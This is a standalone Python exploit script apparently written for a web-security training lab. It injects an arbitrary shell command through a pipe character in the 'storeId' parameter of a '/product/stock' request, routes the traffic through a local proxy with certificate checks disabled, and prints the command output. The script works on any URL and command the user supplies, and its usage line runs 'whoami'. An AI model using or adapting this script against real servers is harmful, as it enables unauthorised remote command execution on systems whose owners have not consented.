import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8081","https":"http://127.0.0.1:8081"}

def command_execution(url,command):
    path="/product/stock"
    command_injection='1 | ' + command
    params={'productId':'1','storeId':command_injection}
    r=requests.post(url+path,data=params,verify=False,proxies=proxies)
    if len(r.text) > 3:
        print("[+] Command Execution Sucessfull.")
        print(r.text)
        sys.exit(0)
    else:
        print("[+] Command Execution Failed.")
        sys.exit(-1)

def main():
    if len(sys.argv)!=3:
        print("[+] Usage: %s <url> <command>" % sys.argv[0])
        print("[+] Example: %s https://evil.com whoami" % sys.argv[0])
        sys.exit(-1)
    else:
        url=sys.argv[1].rstrip("/")
        command=sys.argv[2]
        command_execution(url,command)

if __name__=="__main__":
    main()

